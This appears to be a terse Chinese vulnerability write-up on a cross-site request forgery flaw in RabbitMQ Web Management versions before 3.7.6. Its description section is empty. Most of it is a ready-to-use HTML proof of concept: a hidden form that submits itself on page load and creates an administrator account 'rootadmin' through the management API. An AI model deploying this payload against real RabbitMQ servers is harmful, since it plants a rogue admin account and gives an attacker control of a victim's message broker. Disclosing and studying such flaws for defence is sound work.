RabbitMQ Web管理csrf漏洞
========================

一、漏洞简介
------------

二、漏洞影响
------------

RabbitMQ Web Management \< 3.7.6

三、复现过程
------------

    <html> 
    <h2>Add RabbitMQ Admin</h2>
    <body>
    <form name="rabbit" id="rabbit" action="https://www.0-sec.org/api/users/rootadmin" method="POST">
    <input type="hidden" name="username" value="rootadmin" />
    <input type="hidden" name="password" value="rootadmin" />
    <input type="hidden" name="tags" value="administrator" />
    <input type="submit"  value="save" />
    </form>
    <script>
      window.onload = rabbit.submit()
    </script>
    </body>
    </html>
